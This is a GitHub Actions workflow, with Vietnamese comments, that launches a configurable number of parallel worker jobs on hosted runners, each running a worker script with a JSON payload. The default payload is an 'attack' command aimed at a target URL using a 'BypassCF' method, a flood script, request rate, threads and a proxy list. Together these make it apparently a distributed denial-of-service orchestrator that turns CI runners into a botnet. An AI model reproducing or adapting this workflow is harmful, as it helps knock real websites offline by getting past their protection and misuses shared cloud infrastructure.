name: ga-worker

on:
  workflow_dispatch:
    inputs:
      count:
        description: "Số worker (matrix)"
        required: true
        default: "5"
      minutes:
        description: "Mỗi worker chạy bao lâu (phút) - dùng làm giới hạn tối đa"
        required: true
        default: "5"
      parallel:
        description: "Số job chạy đồng thời"
        required: true
        default: "5"
      payload:
        description: "JSON lệnh cho worker (vd attack/fetch/...)"
        required: true
        default: '{"cmd":"attack","args":{"target":"https://example.com","duration":60,"method":"BypassCF","script":"cfhieu.js","rate":"16","thread":"3","proxyfile":"proxy.txt"}}'

jobs:
  make-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set.outputs.matrix }}
    steps:
      - id: set
        shell: bash
        run: |
          n=${{ inputs.count }}
          printf 'matrix={"idx":[' > "$GITHUB_OUTPUT"
          for i in $(seq 1 "$n"); do
            if [ "$i" -gt 1 ]; then printf ',' >> "$GITHUB_OUTPUT"; fi
            printf '%s' "$i" >> "$GITHUB_OUTPUT"
          done
          printf ']}\n' >> "$GITHUB_OUTPUT"

  run-workers:
    needs: make-matrix
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: ${{ fromJSON(inputs.parallel) }}
      matrix: ${{ fromJSON(needs.make-matrix.outputs.matrix) }}

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - uses: actions/setup-node@v3
        with:
          node-version: '16'

      - name: Install dependencies
        run: |
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
          npm install

      - name: Debug environment
        run: |
          echo "Working directory: $(pwd)"
          echo "Payload JSON: ${{ inputs.payload }}"
          ls -la

      - name: Create payload file and run worker #${{ matrix.idx }}
        env:
          WORKER_ID: ${{ matrix.idx }}
          PAYLOAD_JSON: ${{ inputs.payload }}
          FORCE_GA: "1"
        run: |
          echo "START worker #${{ matrix.idx }}"
          echo "Payload received: $PAYLOAD_JSON"
          # Tạo file payload.json với quyền ghi rõ ràng
          echo "$PAYLOAD_JSON" | tee payload.json
          chmod +rwx payload.json
          # Kiểm tra file
          if [ ! -f payload.json ]; then
            echo "Error: payload.json not created!"
            exit 1
          fi
          # Lấy duration từ payload
          DURATION=$(jq -r '.args.duration' payload.json 2>/dev/null || echo "${{ fromJSON(inputs.payload).args.duration }}")
          if [ -z "$DURATION" ]; then
            DURATION=$(( ${{ inputs.minutes }} * 60 ))
            echo "Warning: duration not found in payload, using default $DURATION seconds"
          fi
          # Chạy worker
          python3 vps_worker.py --payload payload.json
          sleep "$DURATION"
          echo "END worker #${{ matrix.idx }}"
